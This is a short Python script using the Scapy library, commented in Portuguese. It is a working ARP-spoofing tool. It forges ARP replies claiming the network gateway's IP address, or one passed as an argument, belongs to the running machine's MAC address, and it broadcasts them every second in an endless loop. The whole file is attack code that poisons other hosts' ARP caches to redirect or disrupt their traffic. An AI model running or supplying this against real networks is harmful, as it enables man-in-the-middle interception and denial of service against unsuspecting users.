from scapy.all import *
from scapy.layers.inet import *
from scapy.layers.l2 import *
import time
import sys

spoof_ip = "192.168.0.1" #IP a ser falsificado (neste exemplo: Gateway da rede)
my_mac = get_if_hwaddr(conf.iface) #MAC Address da interface padrão
target_IP = "192.168.0.255" #broadcast
target_MAC = "FF:FF:FF:FF:FF:FF" #broadcast

if len(sys.argv) > 1:
    spoof_ip = sys.argv[1]

frame = ARP(hwtype = 1, ptype = 0x0800, hwlen = 6, plen = 4, op = 2, hwsrc = my_mac, psrc = spoof_ip, hwdst = target_MAC, pdst = target_IP)
try:
    while True:
        send(frame, verbose=False)
        print("Sent {0} is at {1}".format(spoof_ip, my_mac))
        time.sleep(1)
except Exception as e:
    print("Error: " + e.__str__())